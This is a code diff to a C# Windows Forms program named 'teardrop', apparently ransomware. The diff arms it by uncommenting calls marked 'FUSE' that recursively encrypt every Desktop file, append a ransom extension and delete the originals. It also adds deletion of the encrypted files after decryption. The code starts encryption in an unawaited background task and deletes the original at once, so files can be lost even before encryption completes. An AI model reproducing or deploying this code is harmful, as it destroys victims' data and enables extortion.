@@ -19,6 +19,7 @@ namespace teardrop
 {
     public partial class Form1 : Form
     {
+        private const string FILES_WILD_CARD = "*.*";
         public Form1()
         {
             InitializeComponent();
@@ -440,43 +441,55 @@ namespace teardrop
             try
             {
                 // Encrypt Desktop Files first!
-                string[] desktopFiles = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "*.*", SearchOption.AllDirectories);
-                foreach(string s in desktopFiles)
+                string deskTopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+
+                string[] desktopFiles = Directory.GetFiles(deskTopPath, FILES_WILD_CARD, SearchOption.AllDirectories);
+
+                foreach(string filePath in desktopFiles)
                 {
                     try
                     {
-                        if (!s.Contains(Properties.Settings.Default.extension) && !s.Contains("Sytem Volume Information") && mode != "decrypt")
-                        {
-                            // FUSE
-                            //Task.Run(() => Crypto.FileEncrypt(s, Properties.Settings.Default.key));
-                            write("Encrypted " + s);
+                        if (!filePath.Contains(Properties.Settings.Default.extension) && !filePath.Contains("Sytem Volume Information") && mode != "decrypt")
+                        { 
+                            Task.Run(() =>
+                            {
+                                string newFilePathWithExtension = string.Concat(filePath, '.', Properties.Settings.Default.extension);
+
+                                Crypto.EncodeFile(filePath, newFilePathWithExtension, Properties.Settings.Default.key);
+                            });
+
+                            write($"Encrypted {filePath}");
 
                             try
                             {
-                                // FUSE
-                                //File.Delete(s);
+                                File.Delete(filePath);
                             }
                             catch (Exception ex2)
                             {
-                                write("Cant delete file " + ex2.Message);
+                                write($"Cant delete file {ex2.Message}");
                                 Log(ex2.Message, "GetFiles > File Delete Error");
                             }
                         }
-                        else if(mode == "decrypt")
+                        else if (mode == "decrypt")
                         {
-                            if(s.Contains(Properties.Settings.Default.extension) && !s.Contains("System Volume Information"))
+                            if (filePath.Contains(Properties.Settings.Default.extension) && !filePath.Contains("System Volume Information"))
                             {
-                                Task.Run(() => Crypto.FileDecrypt(s, s.Replace(Properties.Settings.Default.extension, ""), Properties.Settings.Default.key));
-                                write("Decrypted " + s);
+                                Task.Run(() =>
+                                {
+                                    string newFilePathWithoutExtension = filePath.Replace(Properties.Settings.Default.extension, string.Empty);
+
+                                    Crypto.DecodeFile(filePath, newFilePathWithoutExtension, Properties.Settings.Default.key);
+                                });
+
+                                write($"Decrypted {filePath}");
 
                                 try
                                 {
-                                    // Delete original encrypted file?
-                                    //File.Delete(s);
+                                    File.Delete(filePath);
                                 }
                                 catch (Exception ex2)
                                 {
-                                    write("Cant delete file " + ex2.Message);
+                                    write($"Cant delete file {ex2.Message}");
                                     Log(ex2.Message, "GetFiles > File Delete Error");
                                 }
                             }
